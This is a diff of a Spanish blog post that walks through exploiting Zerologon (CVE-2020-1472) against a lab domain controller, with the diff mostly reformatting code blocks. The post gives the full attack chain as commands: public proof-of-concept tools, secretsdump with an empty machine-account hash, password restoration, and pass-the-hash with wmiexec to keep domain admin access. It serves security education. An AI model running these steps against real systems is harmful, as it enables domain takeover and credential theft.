@@ -45,9 +45,11 @@ Netlogon utiliza un protocolo criptográfico basado en AES-CFB8 que define IVs f
 La empresa Secura publicó una herramienta para identificar si una máquina es
 vulnerable a Zerologon en un repositorio de github [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
 
-Nos clonamos la herramienta con `git clone
-https://github.com/SecuraBV/CVE-2020-1472.git` y la lanzamos contra nuestro
-controlador de dominio virtualizado, que se llama DC01 y tiene la ip
+Nos clonamos la herramienta con 
+```bash
+git clone https://github.com/SecuraBV/CVE-2020-1472.git
+``` 
+y la lanzamos contra nuestro controlador de dominio virtualizado, que se llama DC01 y tiene la ip
 192.168.160.131
 
 ![](/assets/images/Zerologon/testing.png)
@@ -66,8 +68,10 @@ crackmapexec.
 Existen varias pruebas de concepto que explotan zerologon pero yo en este caso
 voy a utilizar ésta: [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
 
-Igual que antes, nos clonamos el repositorio con `git clone
-https://github.com/dirkjanm/CVE-2020-1472.git`
+Igual que antes, nos clonamos el repositorio con 
+```bash
+git clone https://github.com/dirkjanm/CVE-2020-1472.git
+```
 
 ![](/assets/images/Zerologon/clone.png)
 
@@ -75,7 +79,7 @@ Y ahora ejecutamos el script en python, pero antes vamos a crear un entorno
 virtual con virtualenv para que no nos den problemas los scripts de impacket.
 
 Para ello ejecutamos 
-```
+```bash
 virtualenv zerologon
 source zerologon/bin/activate
 ```
@@ -83,7 +87,7 @@ source zerologon/bin/activate
 Ahora nos vamos al directorio opt y nos clonamos la suite de herramientas de
 impacket
 
-```
+```bash
 git clone https://github.com/SecureAuthCorp/impacket
 cd impacket
 sudo pip install .
@@ -99,7 +103,7 @@ las contraseñas. Le pasamos un hash que corresponde a todo ceros para la cuenta
 de máquina del controlador del dominio, por eso ponemos dom01.local/DC01$ con
 un signo de dolar al final.
 
-```
+```bash
 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'dom01.local/DC01$@192.168.160.131'
 ```
 
@@ -136,7 +140,7 @@ Para restablecerla usaremos de nuevo secretsdump pero esta vez con el hash del
 administrador, lo que nos devolverá la *plain_password_hex* original para poder
 restablecerla con el script restorepassword.py
 
-```
+```bash
 secretsdump.py dom01.local/administrador@192.168.160.131 -target-ip 192.168.160.131 -hashes :57987b38d5ba54e02daa2d5d7579765b
 ```
 
@@ -150,7 +154,7 @@ DOM01\DC01$:plain_password_hex:fc3547348ef0ff05e8427168cd24be642dc407bf1d352de42
 Solo quedaría ejecutar el script para restablecer la contraseña local de la
 cuenta de equipo.
 
-```
+```bash
 sudo python3 restorepassword.py dom01.local/DC01@DC01 -target-ip 192.168.160.131 -hexpass fc3547348ef0ff05e8427168cd24be642dc407bf1d352de423fe0651b653ce853d7e37c957bd504444cd6898b301f56c00061671e25c11ddcf3890ef8b8bfcc41c8672fa708c4aa5981d8a1006288e7938887597eef55c630b37d5ddcd5635237f0b9be59944353f7ac163f60ad134c4f9506f768c49a33beda57a039e2a50d2d022c50a3d488998ee7f6cf2861c82bba15a67121c896fd479dc2688a6a2400b3a0c49ae1af1909672033929927e38e91fbe1a01e6d4ee15a381b6ccc42cdcc578fad4630161d429bc63fc7376e5debc403afba544390b42592408bb44c47e6da38b111d98d9cb9fadbfa89bb2936f53
 ```
 
@@ -164,7 +168,7 @@ de la cuenta del equipo vacía.
 
 Y efectívamente, todo ha vuelto a la normalidad, pero seguimos teniendo acceso al equipo como administrador del dominio porque seguimos teniendo el hash de la contraseña de la cuenta del administrador para hacer pass the hash.
 
-```
+```baah
 wmiexec.py -hashes :57987b38d5ba54e02daa2d5d7579765b Administrador@192.168.160.131
 ```
 
